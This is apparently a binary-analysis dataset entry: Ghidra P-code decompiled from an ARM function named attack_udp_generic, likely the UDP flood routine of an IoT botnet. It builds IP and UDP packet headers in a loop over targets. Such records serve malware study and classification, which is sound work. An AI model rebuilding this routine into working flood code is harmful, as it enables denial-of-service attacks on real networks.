Label: 857
Function: attack_udp_generic
Architecture: arm
Source File: Unknown
Entry Point: 00018938

High-level P-code:

(register, 0x2c, 4) INT_ZEXT (register, 0x20, 1)
(unique, 0x1000021e, 4) CALL (ram, 0x26a60, 8) , (register, 0x2c, 4) , (const, 0x4, 4)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x3d, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x5b6, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (register, 0x2c, 4) , (const, 0x5b6, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (register, 0x2c, 4) , (const, 0x5b6, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x5b6, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x5b6, 4)
(stack, 0xffffffffffffffdd, 1) INDIRECT (stack, 0xffffffffffffffdd, 1) , (const, 0x5b6, 4)
(stack, 0xffffffffffffffde, 2) INDIRECT (stack, 0xffffffffffffffde, 2) , (const, 0x5b6, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x5b6, 4)
(stack, 0xffffffffffffffe2, 1) INDIRECT (stack, 0xffffffffffffffe2, 1) , (const, 0x5b6, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x5b6, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x5b6, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x5b6, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x5b6, 4)
(stack, 0xffffffffffffffee, 2) INDIRECT (stack, 0xffffffffffffffee, 2) , (const, 0x5b6, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x5bd, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x5bd, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x5bd, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x5bd, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffc0, 4) , (const, 0x2, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (stack, 0xffffffffffffffe4, 2)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x5c3, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x5c3, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x5c3, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x5c3, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x5c3, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x5c3, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x5c3, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x5c3, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x5c3, 4)
(stack, 0xffffffffffffffdd, 1) INDIRECT (stack, 0xffffffffffffffdd, 1) , (const, 0x5c3, 4)
(stack, 0xffffffffffffffde, 2) INDIRECT (stack, 0xffffffffffffffde, 2) , (const, 0x5c3, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x5c3, 4)
(stack, 0xffffffffffffffe2, 1) INDIRECT (stack, 0xffffffffffffffe2, 1) , (const, 0x5c3, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x5c3, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x5c3, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x5c3, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x5c3, 4)
(stack, 0xffffffffffffffee, 2) INDIRECT (stack, 0xffffffffffffffee, 2) , (const, 0x5c3, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x5ca, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x5ca, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x5ca, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x5ca, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffc0, 4) , (const, 0x4, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (stack, 0xffffffffffffffe3, 1)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x5d2, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x5d2, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x5d2, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x5d2, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffc0, 4) , (const, 0x8, 4)
(register, 0x65, 1) INT_NOTEQUAL (stack, 0xffffffffffffffe2, 1) , (const, 0x0, 1)
 ---  CBRANCH (ram, 0x18be4, 1) , (register, 0x65, 1)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (const, 0x4000, 2)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x5f4, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x5f4, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x5f4, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x5f4, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x5f4, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x5f4, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x5f4, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x5f4, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x5f4, 4)
(stack, 0xffffffffffffffdd, 1) INDIRECT (stack, 0xffffffffffffffdd, 1) , (const, 0x5f4, 4)
(stack, 0xffffffffffffffde, 2) INDIRECT (stack, 0xffffffffffffffde, 2) , (const, 0x5f4, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x5f4, 4)
(stack, 0xffffffffffffffe2, 1) INDIRECT (stack, 0xffffffffffffffe2, 1) , (const, 0x5f4, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x5f4, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x5f4, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x5f4, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x5f4, 4)
(stack, 0xffffffffffffffee, 2) INDIRECT (stack, 0xffffffffffffffee, 2) , (const, 0x5f4, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x5fb, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x5fb, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x5fb, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x5fb, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffc0, 4) , (const, 0x6, 4)
(ram, 0x18f54, 4) MULTIEQUAL (ram, 0x18f54, 4) , (ram, 0x18f54, 4)
(ram, 0x18f58, 4) MULTIEQUAL (ram, 0x18f58, 4) , (ram, 0x18f58, 4)
(ram, 0x18f5c, 4) MULTIEQUAL (ram, 0x18f5c, 4) , (ram, 0x18f5c, 4)
(ram, 0x18f60, 4) MULTIEQUAL (ram, 0x18f60, 4) , (ram, 0x18f60, 4)
(stack, 0xffffffffffffffb8, 4) MULTIEQUAL (stack, 0xffffffffffffffb8, 4) , (stack, 0xffffffffffffffb8, 4)
(stack, 0xffffffffffffffbc, 4) MULTIEQUAL (stack, 0xffffffffffffffbc, 4) , (stack, 0xffffffffffffffbc, 4)
(stack, 0xffffffffffffffc0, 4) MULTIEQUAL (stack, 0xffffffffffffffc0, 4) , (stack, 0xffffffffffffffc0, 4)
(stack, 0xffffffffffffffd4, 4) MULTIEQUAL (stack, 0xffffffffffffffd4, 4) , (stack, 0xffffffffffffffd4, 4)
(stack, 0xffffffffffffffd8, 4) MULTIEQUAL (stack, 0xffffffffffffffd8, 4) , (stack, 0xffffffffffffffd8, 4)
(stack, 0xffffffffffffffdd, 1) MULTIEQUAL (stack, 0xffffffffffffffdd, 1) , (stack, 0xffffffffffffffdd, 1)
(stack, 0xffffffffffffffde, 2) MULTIEQUAL (stack, 0xffffffffffffffde, 2) , (stack, 0xffffffffffffffde, 2)
(stack, 0xffffffffffffffe0, 2) MULTIEQUAL (stack, 0xffffffffffffffe0, 2) , (stack, 0xffffffffffffffe0, 2)
(stack, 0xffffffffffffffe2, 1) MULTIEQUAL (stack, 0xffffffffffffffe2, 1) , (stack, 0xffffffffffffffe2, 1)
(stack, 0xffffffffffffffe3, 1) MULTIEQUAL (stack, 0xffffffffffffffe3, 1) , (stack, 0xffffffffffffffe3, 1)
(stack, 0xffffffffffffffe4, 2) MULTIEQUAL (stack, 0xffffffffffffffe4, 2) , (stack, 0xffffffffffffffe4, 2)
(stack, 0xffffffffffffffe7, 1) MULTIEQUAL (stack, 0xffffffffffffffe7, 1) , (stack, 0xffffffffffffffe7, 1)
(stack, 0xffffffffffffffe8, 4) MULTIEQUAL (stack, 0xffffffffffffffe8, 4) , (stack, 0xffffffffffffffe8, 4)
(stack, 0xffffffffffffffee, 2) MULTIEQUAL (stack, 0xffffffffffffffee, 2) , (stack, 0xffffffffffffffee, 2)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (const, 0x11, 1)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x60c, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x60c, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x60c, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x60c, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffc0, 4) , (const, 0x9, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x10000169, 4) , (stack, 0xffffffffffffffd8, 4)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x612, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x612, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x612, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x612, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffc0, 4) , (const, 0xc, 4)
(unique, 0x10000169, 4) PTRSUB (unique, 0x10000242, 4) , (const, 0x0, 4)
(unique, 0x10000242, 4) PTRSUB (unique, 0x8280, 4) , (const, 0x0, 4)
(register, 0x28, 4) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x10000171, 4) PTRADD (register, 0x24, 4) , (stack, 0xffffffffffffffb8, 4) , (const, 0x18, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x10000171, 4) , (const, 0x10, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (register, 0x28, 4)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x63f, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x63f, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x63f, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x63f, 4)
(unique, 0x10000179, 4) PTRSUB (stack, 0xffffffffffffffc0, 4) , (const, 0xc, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x10000246, 4) , (const, 0x4, 4)
(unique, 0x10000246, 4) PTRSUB (unique, 0x10000179, 4) , (const, 0x0, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (stack, 0xffffffffffffffe0, 2)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x645, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x645, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x645, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x645, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x645, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x645, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x645, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x645, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x645, 4)
(stack, 0xffffffffffffffdd, 1) INDIRECT (stack, 0xffffffffffffffdd, 1) , (const, 0x645, 4)
(stack, 0xffffffffffffffde, 2) INDIRECT (stack, 0xffffffffffffffde, 2) , (const, 0x645, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x645, 4)
(stack, 0xffffffffffffffe2, 1) INDIRECT (stack, 0xffffffffffffffe2, 1) , (const, 0x645, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x645, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x645, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x645, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x645, 4)
(stack, 0xffffffffffffffee, 2) INDIRECT (stack, 0xffffffffffffffee, 2) , (const, 0x645, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x10000181, 4) , (register, 0x20, 2)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x64c, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x64c, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x64c, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x64c, 4)
(unique, 0x10000181, 4) PTRSUB (stack, 0xffffffffffffffbc, 4) , (const, 0x0, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (stack, 0xffffffffffffffde, 2)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x652, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x652, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x652, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x652, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x652, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x652, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x652, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x652, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x652, 4)
(stack, 0xffffffffffffffdd, 1) INDIRECT (stack, 0xffffffffffffffdd, 1) , (const, 0x652, 4)
(stack, 0xffffffffffffffde, 2) INDIRECT (stack, 0xffffffffffffffde, 2) , (const, 0x652, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x652, 4)
(stack, 0xffffffffffffffe2, 1) INDIRECT (stack, 0xffffffffffffffe2, 1) , (const, 0x652, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x652, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x652, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x652, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x652, 4)
(stack, 0xffffffffffffffee, 2) INDIRECT (stack, 0xffffffffffffffee, 2) , (const, 0x652, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x659, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x659, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x659, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x659, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffbc, 4) , (const, 0x2, 4)
(register, 0x2c, 2) INT_ADD (stack, 0xffffffffffffffee, 2) , (const, 0x8, 2)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (register, 0x2c, 2)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x67f, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x67f, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x67f, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x67f, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x67f, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x67f, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x67f, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x67f, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x67f, 4)
(stack, 0xffffffffffffffdd, 1) INDIRECT (stack, 0xffffffffffffffdd, 1) , (const, 0x67f, 4)
(stack, 0xffffffffffffffde, 2) INDIRECT (stack, 0xffffffffffffffde, 2) , (const, 0x67f, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x67f, 4)
(stack, 0xffffffffffffffe2, 1) INDIRECT (stack, 0xffffffffffffffe2, 1) , (const, 0x67f, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x67f, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x67f, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x67f, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x67f, 4)
(stack, 0xffffffffffffffee, 2) INDIRECT (stack, 0xffffffffffffffee, 2) , (const, 0x67f, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x686, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x686, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x686, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x686, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffbc, 4) , (const, 0x4, 4)
(register, 0x2c, 4) INT_ADD (stack, 0xffffffffffffffb8, 4) , (const, 0x1, 4)
(register, 0x28, 4) INT_ZEXT (register, 0x20, 1)
(ram, 0x18f54, 4) MULTIEQUAL (ram, 0x18f54, 4) , (ram, 0x18f54, 4)
(ram, 0x18f58, 4) MULTIEQUAL (ram, 0x18f58, 4) , (ram, 0x18f58, 4)
(ram, 0x18f5c, 4) MULTIEQUAL (ram, 0x18f5c, 4) , (ram, 0x18f5c, 4)
(ram, 0x18f60, 4) MULTIEQUAL (ram, 0x18f60, 4) , (ram, 0x18f60, 4)
(stack, 0xffffffffffffffb8, 4) MULTIEQUAL (stack, 0xffffffffffffffb8, 4) , (register, 0x2c, 4)
(stack, 0xffffffffffffffbc, 4) MULTIEQUAL (stack, 0xffffffffffffffbc, 4) , (stack, 0xffffffffffffffbc, 4)
(stack, 0xffffffffffffffc0, 4) MULTIEQUAL (stack, 0xffffffffffffffc0, 4) , (stack, 0xffffffffffffffc0, 4)
(stack, 0xffffffffffffffd4, 4) MULTIEQUAL (stack, 0xffffffffffffffd4, 4) , (stack, 0xffffffffffffffd4, 4)
(stack, 0xffffffffffffffd8, 4) MULTIEQUAL (stack, 0xffffffffffffffd8, 4) , (stack, 0xffffffffffffffd8, 4)
(stack, 0xffffffffffffffdd, 1) MULTIEQUAL (stack, 0xffffffffffffffdd, 1) , (stack, 0xffffffffffffffdd, 1)
(stack, 0xffffffffffffffde, 2) MULTIEQUAL (stack, 0xffffffffffffffde, 2) , (stack, 0xffffffffffffffde, 2)
(stack, 0xffffffffffffffe0, 2) MULTIEQUAL (stack, 0xffffffffffffffe0, 2) , (stack, 0xffffffffffffffe0, 2)
(stack, 0xffffffffffffffe2, 1) MULTIEQUAL (stack, 0xffffffffffffffe2, 1) , (stack, 0xffffffffffffffe2, 1)
(stack, 0xffffffffffffffe3, 1) MULTIEQUAL (stack, 0xffffffffffffffe3, 1) , (stack, 0xffffffffffffffe3, 1)
(stack, 0xffffffffffffffe4, 2) MULTIEQUAL (stack, 0xffffffffffffffe4, 2) , (stack, 0xffffffffffffffe4, 2)
(stack, 0xffffffffffffffe7, 1) MULTIEQUAL (stack, 0xffffffffffffffe7, 1) , (stack, 0xffffffffffffffe7, 1)
(stack, 0xffffffffffffffe8, 4) MULTIEQUAL (stack, 0xffffffffffffffe8, 4) , (stack, 0xffffffffffffffe8, 4)
(stack, 0xffffffffffffffee, 2) MULTIEQUAL (stack, 0xffffffffffffffee, 2) , (stack, 0xffffffffffffffee, 2)
(unique, 0x2480, 1) INT_SLESS (stack, 0xffffffffffffffb8, 4) , (unique, 0x10000222, 4)
 ---  CBRANCH (ram, 0x18af4, 1) , (unique, 0x2480, 1)
(unique, 0x10000222, 4) CAST (register, 0x28, 4)
(ram, 0x18f54, 4) MULTIEQUAL (ram, 0x18f54, 4) , (ram, 0x18f54, 4)
(ram, 0x18f58, 4) MULTIEQUAL (ram, 0x18f58, 4) , (ram, 0x18f58, 4)
(ram, 0x18f5c, 4) MULTIEQUAL (ram, 0x18f5c, 4) , (ram, 0x18f5c, 4)
(ram, 0x18f60, 4) MULTIEQUAL (ram, 0x18f60, 4) , (ram, 0x18f60, 4)
(stack, 0xffffffffffffffbc, 4) MULTIEQUAL (stack, 0xffffffffffffffbc, 4) , (stack, 0xffffffffffffffbc, 4)
(stack, 0xffffffffffffffc0, 4) MULTIEQUAL (stack, 0xffffffffffffffc0, 4) , (stack, 0xffffffffffffffc0, 4)
(stack, 0xffffffffffffffd4, 4) MULTIEQUAL (stack, 0xffffffffffffffd4, 4) , (stack, 0xffffffffffffffd4, 4)
(stack, 0xffffffffffffffd8, 4) MULTIEQUAL (stack, 0xffffffffffffffd8, 4) , (stack, 0xffffffffffffffd8, 4)
(stack, 0xffffffffffffffdd, 1) MULTIEQUAL (stack, 0xffffffffffffffdd, 1) , (stack, 0xffffffffffffffdd, 1)
(stack, 0xffffffffffffffde, 2) MULTIEQUAL (stack, 0xffffffffffffffde, 2) , (stack, 0xffffffffffffffde, 2)
(stack, 0xffffffffffffffe0, 2) MULTIEQUAL (stack, 0xffffffffffffffe0, 2) , (stack, 0xffffffffffffffe0, 2)
(stack, 0xffffffffffffffe2, 1) MULTIEQUAL (stack, 0xffffffffffffffe2, 1) , (stack, 0xffffffffffffffe2, 1)
(stack, 0xffffffffffffffe3, 1) MULTIEQUAL (stack, 0xffffffffffffffe3, 1) , (stack, 0xffffffffffffffe3, 1)
(stack, 0xffffffffffffffe4, 2) MULTIEQUAL (stack, 0xffffffffffffffe4, 2) , (stack, 0xffffffffffffffe4, 2)
(stack, 0xffffffffffffffe7, 1) MULTIEQUAL (stack, 0xffffffffffffffe7, 1) , (stack, 0xffffffffffffffe7, 1)
(stack, 0xffffffffffffffe8, 4) MULTIEQUAL (stack, 0xffffffffffffffe8, 4) , (stack, 0xffffffffffffffe8, 4)
(stack, 0xffffffffffffffee, 2) MULTIEQUAL (stack, 0xffffffffffffffee, 2) , (stack, 0xffffffffffffffee, 2)
(stack, 0xffffffffffffffb8, 4) COPY (const, 0x0, 4)
 ---  BRANCH (ram, 0x18f34, 1)
(register, 0x2c, 4) PTRADD (stack, 0xffffffffffffffe8, 4) , (stack, 0xffffffffffffffb8, 4) , (const, 0x4, 4)
(unique, 0x1000024e, 4) LOAD (const, 0x1a1, 4) , (register, 0x2c, 4)
(register, 0x2c, 4) CAST (unique, 0x1000024e, 4)
(unique, 0x10000252, 4) PTRADD (register, 0x2c, 4) , (const, 0x1, 4) , (const, 0x14, 4)
(register, 0x2c, 4) CAST (unique, 0x10000252, 4)
(unique, 0x10000195, 4) PTRADD (register, 0x2c, 4) , (const, 0x1, 4) , (const, 0x14, 4)
(unique, 0x10000256, 4) PTRSUB (unique, 0x10000195, 4) , (const, 0x8, 4)
